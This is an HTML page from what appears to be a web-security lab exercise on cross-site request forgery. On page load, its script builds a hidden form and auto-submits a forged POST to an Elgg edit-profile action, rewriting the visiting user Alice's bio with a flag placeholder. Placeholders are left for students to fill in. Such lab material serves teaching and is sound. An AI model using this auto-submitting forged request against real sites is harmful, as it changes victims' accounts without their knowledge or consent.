<html>
<head><title>CSRF POST Attack</title></head>
<body>
<h1>This page forges an HTTP POST request.</h1>
<p>When Alice visits this page, her browser auto-submits a form that overwrites her Elgg profile bio.</p>

<!--
  TASK 3 — POST CSRF
  The student must fill in:
    - Alice's GUID (replace ALICE_GUID — find it in Alice's profile URL)
    - The form action URL (Elgg edit-profile action)
  The briefdescription value is intentionally set to the flag string.
  When the attack succeeds, Alice's bio in Elgg will show the flag.
  The student reads the flag directly from Alice's Elgg profile page.
-->
<script type="text/javascript">
function forge_post() {
    var fields = "";
    fields += "<input type='hidden' name='name'               value='Alice'>";
    fields += "<input type='hidden' name='briefdescription'   value='TASK3_FLAG_PLACEHOLDER'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
    fields += "<input type='hidden' name='guid'               value='ALICE_GUID'>";

    var p = document.createElement("form");
    p.action   = "http://www.seed-server.com/action/profile/edit";
    p.innerHTML = fields;
    p.method   = "post";

    document.body.appendChild(p);
    p.submit();
}

window.onload = function() { forge_post(); }
</script>

</body>
</html>
